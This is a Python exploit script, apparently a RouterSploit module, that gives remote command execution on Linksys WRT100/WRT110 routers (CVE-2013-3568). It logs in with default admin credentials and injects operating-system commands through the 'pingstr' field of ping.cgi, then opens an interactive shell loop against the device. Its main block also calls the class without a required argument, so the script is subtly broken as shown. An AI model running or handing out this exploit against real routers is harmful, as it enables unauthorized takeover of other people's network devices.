target = ""
# rsf exploit module
# description: Module exploits remote command execution in Linksys WRT100/WRT110 devices. If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.

import requests

class Exploit:
    __info__ = {
        "name": "Linksys WRT100/WRT110 RCE",
        "description": "Module exploits remote command execution in Linksys WRT100/WRT110 devices. "
                       "If the target is vulnerable, command loop is invoked that allows executing commands "
                       "on operating system level.",
        "authors": (
            "Craig Young",  
            "Marcin Bury",  
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3568",
            "http://seclists.org/bugtraq/2013/Jul/78",
        ),
        "devices": (
            "Linksys WRT100",
            "Linksys WRT110",
        )
    }

    def __init__(self, target, username="admin", password="admin"):
        self.target = target
        self.username = username
        self.password = password

    def run(self):
        if self.check():
            print("Target appears to be vulnerable")
            if self.test_auth():
                print("Invoking command loop...")
                self.shell()
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        payload = "& {}".format(cmd)
        data = {"pingstr": payload}
        requests.post(self.target + "/ping.cgi", data=data, auth=(self.username, self.password))

    def check(self):
        response = requests.get(self.target + "/HNAP1/")
        if response and "<ModelName>WRT110</ModelName>" in response.text:
            return True
        return False

    def test_auth(self):
        response = requests.get(self.target + "/", auth=(self.username, self.password))
        if response.status_code != 401 and response.status_code != 404:
            print("Successful authentication {}:{}".format(self.username, self.password))
            return True
        print("Could not authenticate {}:{}".format(self.username, self.password))
        return False

    def shell(self):
        while True:
            cmd = input("Shell> ")
            if cmd == "exit":
                break
            self.execute(cmd)




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
